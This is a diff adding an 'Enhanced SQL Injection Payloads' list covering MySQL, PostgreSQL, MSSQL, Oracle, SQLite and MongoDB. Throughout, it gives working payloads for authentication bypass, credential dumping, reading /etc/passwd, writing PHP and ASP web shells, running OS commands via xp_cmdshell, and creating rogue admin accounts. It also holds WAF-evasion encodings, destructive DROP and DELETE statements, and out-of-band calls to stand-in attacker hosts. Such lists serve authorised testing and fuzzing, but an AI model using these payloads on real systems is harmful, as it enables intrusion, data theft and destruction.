@@ -1,0 +1,310 @@
+# Enhanced SQL Injection Payloads
+# Author: Abdulrahman Muhammad (0xLegacy)
+# Contains payloads for various database types, WAF bypasses, and sophisticated attack vectors
+
+# Basic Authentication Bypass
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+" OR "1"="1" --
+' OR '1'='1' /*
+" OR "1"="1" /*
+') OR ('1'='1
+") OR ("1"="1
+') OR ('1'='1'--
+' OR 1=1--
+" OR 1=1--
+or 1=1--
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+") or ("x"="x
+' OR 'x'='x' --
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+
+# MySQl
+' UNION SELECT 1,2,3-- -
+' UNION SELECT 1,2,3,4-- -
+' UNION SELECT 1,2,3,4,5-- -
+' UNION SELECT 1,2,3,4,5,6-- -
+' UNION SELECT 1,2,3,4,5,6,7-- -
+' UNION ALL SELECT 1,2,3,4,5,6,7-- -
+' UNION SELECT user(),version(),database()-- -
+' UNION SELECT user(),version(),database(),@@datadir-- -
+' UNION SELECT CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT 1,2,CONCAT(username,':',password) FROM users-- -
+' UNION SELECT LOAD_FILE('/etc/passwd')-- -
+' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
+' OR SLEEP(5)-- -
+' AND SLEEP(5)-- -
+' AND (SELECT COUNT(*) FROM users) > 0-- -
+' AND (SELECT * FROM users WHERE username = 'admin') IS NOT NULL-- -
+' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))-- -
+' OR IF(1=1, SLEEP(5), 0)-- -
+' OR IF(SUBSTR(user(),1,1)='r',SLEEP(5),0)-- -
+'+BENCHMARK(40000000,SHA1(1337))+'
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))-- -
+' OR 1=1 LIMIT 1 OFFSET 1-- -
+
+# PostgreSQL
+' UNION SELECT 1,2,3;--
+' UNION SELECT 1,2,3,4;--
+' UNION SELECT 1,2,3,4,5;--
+' UNION SELECT NULL, version(), NULL;--
+' UNION SELECT NULL, current_database(), NULL;--
+' UNION SELECT NULL, current_user, NULL;--
+' UNION SELECT NULL, table_name, NULL FROM information_schema.tables;--
+' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users';--
+' UNION SELECT NULL, username||':'||password, NULL FROM users;--
+' UNION SELECT CHR(65)||CHR(66)||CHR(67);--
+'; CREATE TEMPORARY TABLE cmd_exec(cmd_output text); --
+'; COPY cmd_exec FROM PROGRAM 'id'; --
+' UNION SELECT pg_sleep(5);--
+' AND pg_sleep(5)--
+' AND (SELECT COUNT(*) FROM users) > 0;--
+' OR 1::int=1 --
+'; SELECT username || ':' || passwd AS secrets FROM users --
+' AND (SELECT 1 FROM pg_sleep(5))::text::int > 0 --
+
+# MSSQL
+' UNION SELECT 1,2,3;--
+' UNION SELECT 1,2,3,4;--
+' UNION SELECT 1,2,3,4,5;--
+' UNION SELECT NULL, @@version, NULL;--
+' UNION SELECT NULL, db_name(), NULL;--
+' UNION SELECT NULL, user_name(), NULL;--
+' UNION SELECT NULL, name, NULL FROM sysobjects WHERE xtype='U';--
+' UNION SELECT NULL, name, NULL FROM syscolumns WHERE id=object_id('users');--
+' UNION SELECT NULL, username+':'+password, NULL FROM users;--
+'; WAITFOR DELAY '00:00:05';--
+'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+'; EXEC xp_cmdshell 'dir';--
+'; EXEC master..xp_dirtree '\\attacker\share';--
+'; EXEC master..xp_fileexist 'C:\windows\system32\cmd.exe';--
+' AND 1 IN (SELECT @@servername) --
+'; DECLARE @q varchar(8000); SELECT @q = 0x73656c65637420404076657273696f6e; EXEC(@q);--
+'; IF 1=1 WAITFOR DELAY '00:00:05';--
+'; SELECT CHAR(65) + CHAR(66) + CHAR(67);--
+
+# Oracle
+' UNION SELECT 1,2,3 FROM dual;--
+' UNION SELECT 1,2,3,4 FROM dual;--
+' UNION SELECT 1,2,3,4,5 FROM dual;--
+' UNION SELECT NULL, banner, NULL FROM v$version;--
+' UNION SELECT NULL, global_name, NULL FROM global_name;--
+' UNION SELECT NULL, user, NULL FROM dual;--
+' UNION SELECT NULL, table_name, NULL FROM all_tables;--
+' UNION SELECT NULL, column_name, NULL FROM all_tab_columns WHERE table_name='USERS';--
+' UNION SELECT NULL, username||':'||password, NULL FROM users;--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5);--
+' AND extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker/evil.dtd"> %remote;]>'),'/l') FROM dual;--
+' OR UTL_INADDR.get_host_address('attacker.com');--
+' BEGIN DBMS_LOCK.SLEEP(5); END;--
+' SELECT CASE WHEN (SELECT user FROM dual) = 'SYSTEM' THEN 'YES' ELSE 'NO' END FROM dual;--
+' SELECT SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER') FROM dual;-- 
+
+# SQLite
+' UNION SELECT 1,2,3;--
+' UNION SELECT 1,2,3,4;--
+' UNION SELECT 1,2,3,4,5;--
+' UNION SELECT NULL, sqlite_version(), NULL;--
+' UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table';--
+' UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE name='users';--
+' UNION SELECT NULL, username||':'||password, NULL FROM users;--
+' AND 1 IN (SELECT sqlite_version());--
+' AND 1 IN (SELECT length('abc'));--
+' AND 1 IN (SELECT LIKE('abc', 'a%'));--
+' AND 1 IN (SELECT randomblob(10));--
+' AND 1 IN (SELECT 1 FROM pragma_function_list);--
+' AND 1 IN (SELECT 1 FROM sqlite_master);--
+' OR LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))));--
+' OR LIKE('ABCDEFG',HEX(RANDOMBLOB(500000000/2)));--
+'; ATTACH DATABASE '/var/www/html/shell.php' AS shell; CREATE TABLE shell.pwn (dataz text); INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
+
+# Time-Based Blind SQL Injection
+' AND SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(SUBSTRING(user(),1,1)='a',SLEEP(5),0)--
+' AND pg_sleep(5)--
+' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--
+' AND 1 IN (SELECT pg_sleep(5))--
+' WAITFOR DELAY '00:00:05'--
+' OR 1=UTL_INADDR.get_host_address('a.attacker.com')--
+' AND 5=(SELECT COUNT(*) FROM sysusers AS s1,sysusers AS s2,sysusers AS s3);--
+' AND 5=(SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3,all_users t4);--
+'; BEGIN DBMS_LOCK.SLEEP(5); END;--
+' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))));--
+
+# Boolean-Based Blind SQL Injection
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT COUNT(*) FROM users) > 0--
+' AND (ASCII(SUBSTRING((SELECT database()),1,1))) > 90--
+' AND (SELECT substr(table_name,1,1) FROM information_schema.tables) = 'A'--
+' AND (SELECT substr(username,1,1) FROM users) = 'a'--
+' AND (SELECT substring(username,1,1) FROM users) > 'm'--
+' AND (SELECT user()) = 'root@localhost'--
+' AND (SELECT system_user()) = 'root'--
+' OR 1=1--
+' OR 0=0--
+' OR 1=(SELECT 1 FROM dual)--
+' OR 1=(SELECT 1 FROM users WHERE username='admin')--
+' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--
+
+# Error-Based SQL Injection
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
+' AND (SELECT 1 FROM (SELECT count(*),CONCAT(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' OR UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' OR UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--
+' OR 1=CAST((SELECT user) as int)--
+' OR 1=CAST('abc' AS NUMERIC)--
+' OR 1 = regexp_substr(@@version, '[0-9]+')--
+' OR 1=convert(int,(select top 1 name from sysobjects where id=object_id('tablename')))--
+
+# Union Query-based SQL Injection
+' UNION SELECT 1,2,3-- -
+' UNION SELECT 1,2,3,4-- -
+' UNION SELECT 1,2,3,4,5-- -
+' UNION ALL SELECT 1,2,3,4,5,6-- -
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+' UNION ALL SELECT 'a','a','a','a','a'-- -
+' UNION ALL SELECT NULL,NULL,NULL,version(),NULL-- -
+' UNION ALL SELECT NULL,NULL,NULL,current_user(),NULL-- -
+' UNION ALL SELECT NULL,NULL,table_name,NULL,NULL FROM information_schema.tables-- -
+' UNION ALL SELECT NULL,NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
+' UNION ALL SELECT NULL,NULL,concat(username,':',password),NULL,NULL FROM users-- -
+
+# WAF Bypass Techniques
+'/**/OR/**/1=1-- -
+' /*!50000OR*/ '1'='1'-- -
+'/*!OR*//**/1=1-- -
+'/*!OR*//**/1=1/**/-- -
+'OR/**/1=1-- -
+'+OR+1=1-- -
+' OR 1 = 1 -- -
+' O/**/R 1=1-- -
+' OR/**/1/**/=/**/1-- -
+' OR 1=1 LIMIT 1-- -
+' UNION/*!50000SELECT*/1,2,3-- -
+' UNION/**/SELECT/**/1,2,3-- -
+' UNION%0ASELECT%0A1,2,3-- -
+' UNION%09SELECT%0D1,2,3-- -
+' UNION%0CSELECT%07 1,2,3-- -
+/**/union/**/all/**/select/**/1,2,3,4,5,6,7-- -
+%55nion(%53elect)
+'+UnIoN/**/SeLeCT/**/
+'+UnIoN+SeLeCT+
+'+/*!UnIoN*/+/*!SeLeCT*/+
+'+(/*!UnIoN*/)+SeLeCT+
+' UNunionION SEselectLECT 1,2,3-- -
+' U/**/NION S/**/ELECT 1,2,3-- -
+' /**//**//**/UNI/**/ON SELECT 1,2,3-- -
+'UnIoN'||'sElEcT'
+' un?+#union+#select
+' un/**/ion se/**/lect
+' %0aUNION%0aSELECT%0a
+')%0AuNiOn%0AsElEcT%0A
+' UNI%u004fN SELECT
+' UNI%XX%4fN SELECT
+' UNI%a0%4fN SELECT
+' UNION SEL\u0045CT
+' UNI%20ON SE%4cE%43T 1,2,3-- -
+' UNI\u004fN SE\u004cECT 1,2,3-- -
+' UNION all select 1,2,3
+
+# Obfuscated Payloads
+'+UN/**/ION+SE/**/LECT+
+'+unIoN//sElEcT//
+'/**/UNION/**/ALL/**/SELECT/**/
+'+/*!50000UniON*/+/*!50000SeLeCt*/+
+'%55%6e%49%6f%4e %53%65%4c%65%43%74
+'%75%6e%69%6f%6e %73%65%6c%65%63%74
+'%55nion(%53elect)
+'Union(Select(1),2,3)
+
+# NoSQL Injection (MongoDB)
+' || 1==1
+' || 1==1//
+' || 1==1%00
+true, $where: '1 == 1'
+{$gt: ''}
+[$ne]=1
+';sleep(5000);
+';Tis.sleep(5000);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+'||this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")
+
+# Stored Procedure SQL Injection
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE-- -
+'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -
+'; EXEC master.dbo.xp_cmdshell 'net user'-- -
+'; EXEC master.dbo.xp_cmdshell 'ping 10.10.10.10'-- -
+'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT ''<% Set oScript = Server.CreateObject("WSCRIPT.SHELL") %>'' + ''<% oScript.Run("cmd.exe /c calc.exe")%>'''-- -
+'; EXEC master..sp_addlogin 'hacker', 'P@55w0rd'-- -
+'; EXEC master..sp_addsrvrolemember 'hacker', 'sysadmin'-- -
+'; EXEC master..xp_dirtree '\\10.10.10.10\share\'-- -
+'; EXEC master..xp_fileexist 'C:\Windows\system32\cmd.exe'-- -
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'-- -
+'; EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'enableforcedlogoff', 'REG_DWORD', 0-- -
+
+# Advanced SQL Injection techniques
+' IF(SUBSTR(@@version,1,1)='5',SLEEP(5),0)-- -
+' SELECT IF(SUBSTRING(@@version,1,1)='5', BENCHMARK(2000000,SHA1(0xDE7EC71F1)),0)-- -
+' WHERE username = '' AND substring(version(),1,1)>=5#
+'; INSERT INTO users(id, username, password) VALUES (999999, 'attacker', 'password')-- -
+'; CREATE USER 'attacker'@'%' IDENTIFIED BY 'password'-- -
+'; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;-- -
+' IF EXISTS (SELECT * FROM users WHERE username = 'admin') SELECT 1 ELSE SELECT 0-- -
+' select @@datadir;--
+' create table pwn(data text);--
+' load data infile '/etc/passwd' into table pwn;--
+'; DROP TABLE users-- -
+'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255)-- -
+'; UPDATE users SET password = 'hacked' WHERE id = 1-- -
+' INTO OUTFILE '/var/www/html/backdoor.php' LINES TERMINATED BY '<?php system($_GET["cmd"]); ?>'-- -
+' ORDER BY 10-- -
+' GROUP BY 10-- -
+' HAVING 1=1-- -
+' SELECT/**_**/version()/****/
+' SELECT'+extractvalue(1,concat(0x7e,(select version()),0x7e))+' 
+
+# Stacked Queries
+';insert into users(username,password,privileges) values ('hacker','hacked',1);--
+';update users set password='pwned' where username='admin';--
+';delete from logs;--
+';drop table users;--
+';create user 'attacker'@'localhost' identified by 'attackerpass';--
+';GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'localhost';--
+
+# Exotic MySQL Functions
+' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT user())a)b))-- -
+' AND MULTIPOINT((SELECT * FROM (SELECT * FROM(SELECT user())a)b))-- -
+' AND EXP(~(SELECT * FROM (SELECT USER())a))-- -
+' AND ST_LatFromGeoHash((SELECT * FROM (SELECT * FROM (SELECT user())a)b))-- -
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- -
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -
+
+# Alternative Logic-based SQL Injection
+'=''='
+' RLIKE (SELECT(IF(MID(version(),1,1)='5',1,SLEEP(2))))-- -
+' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)),1)-- -
+' AND MAKE_SET(YESNO(MID(version(),1,1)='5'),1)-- -
+' AND X<(SELECT IF(MID(passwd,1,1)='a',1,(SELECT 9223372036854775807+1 INTO OUTFILE '/dev/random')))-- -
